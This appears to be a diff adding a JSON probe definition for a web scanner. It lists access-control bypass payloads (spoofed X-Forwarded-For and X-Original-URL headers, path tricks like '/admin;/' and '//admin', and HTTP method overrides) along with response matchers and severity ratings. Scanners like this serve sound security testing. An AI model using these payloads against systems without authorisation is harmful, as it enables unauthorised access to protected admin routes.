@@ -1,0 +1,109 @@
+{
+  "category": "waf_bypass_40x",
+  "description": "40x bypass surface — header / path / method tricks that flip 401/403 to 2xx on misconfigured ACLs, reverse proxies, and admin route guards.",
+  "contexts": {
+    "header_origin_spoof": {
+      "description": "Origin/IP spoofing headers (X-Forwarded-For=127.0.0.1, X-Original-URL, X-Rewrite-URL) — bypass IP allow-list ACLs or expose admin routes by forging proxy-trust headers.",
+      "tech_match": ["Nginx", "Apache", "HAProxy", "Cloudflare", "AWS ALB", "Akamai", "F5", "Imperva", "Cloudfront"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "description": "Trust-proxy header rewrites client IP -> internal -> bypass IP ACL",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]}
+          ],
+          "severity": "high",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "X-Original-URL: /admin",
+          "description": "URL-override header reroutes request to admin endpoint on Symfony/Laravel/IIS proxies",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]},
+            {"type": "word", "words": ["admin", "dashboard"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75
+        }
+      ]
+    },
+    "path_normalisation_tricks": {
+      "description": "Trailing slash, ;/, /./, %20, %09, double-slash, .json append — abuse reverse-proxy vs origin path normalisation drift.",
+      "tech_match": ["Nginx", "Apache", "HAProxy", "Envoy", "Express", "Spring", "Tomcat"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/admin/",
+          "description": "Trailing slash bypass — proxy ACL exact-matches /admin only",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "/admin;/",
+          "description": "Path-parameter ; confuses Spring / Tomcat / Envoy ACL parsers",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]}
+          ],
+          "severity": "high",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "/admin/..;/",
+          "description": "Servlet path-traversal style — Tomcat / Spring legacy",
+          "matchers": [
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "/admin%20",
+          "description": "Trailing space character bypass — Nginx vs Apache ACL drift",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "//admin",
+          "description": "Double-slash bypass — proxy normalises before ACL, origin treats as fresh path",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "method_override": {
+      "description": "Verb-swap (POST/PUT/DELETE/PATCH/OPTIONS) or X-HTTP-Method-Override on endpoints whose ACL enforces only one verb.",
+      "tech_match": ["Rails", "Express", "Spring", "Django", "Symfony", "Laravel"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST {{baseline}} (was 403 GET)",
+          "description": "Verb swap — ACL only protects GET",
+          "matchers": [
+            {"type": "status", "status": [200, 201, 202]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "X-HTTP-Method-Override: GET",
+          "description": "Method-override header bypasses verb-based ACL",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]}
+          ],
+          "severity": "high",
+          "confidence_boost": 65
+        }
+      ]
+    }
+  }
+}
